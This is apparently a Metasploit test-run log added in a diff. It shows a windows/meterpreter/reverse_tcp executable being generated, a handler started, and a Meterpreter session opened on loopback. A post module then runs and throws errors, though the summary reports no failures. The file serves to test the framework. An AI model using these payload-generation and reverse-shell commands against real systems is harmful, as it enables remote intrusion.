@@ -1,0 +1,26 @@
+use windows/meterpreter/reverse_tcp
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 67 closed.
+[4mmsf6[0m post([1m[31mtest/services[0m) [0m> generate -o D:/a/_temp/meterpreter-spec-rb-windows-meterpreter-reverse-tcp20220124-3356-oayzi7.exe -f exe MeterpreterTryToFork=false lport=6070 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mwindows/meterpreter/reverse_tcp[0m) [0m> [*] Writing 73802 bytes to D:/a/_temp/meterpreter-spec-rb-windows-meterpreter-reverse-tcp20220124-3356-oayzi7.exe...
+[4mmsf6[0m payload([1m[31mwindows/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 65
+[4mmsf6[0m payload([1m[31mwindows/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6070 
+[*] Sending stage (175174 bytes) to 127.0.0.1
+[*] Meterpreter session 68 opened (127.0.0.1:6070 -> 127.0.0.1:50304 ) at 2022-01-24 01:27:09 +0000
+use test/unix
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> run session=68 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[*] Running against session 68
+[*] Session type is meterpreter and platform is windows
+[-] Failed to open file: : core_channel_open: Operation failed: The parameter is incorrect.
+[-] FAILED: should list users
+[-] Exception: NoMethodError : undefined method `split' for nil:NilClass
+[*] Testing complete in 0.2193125
+[*] Passed: 1; Failed: 0
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> 
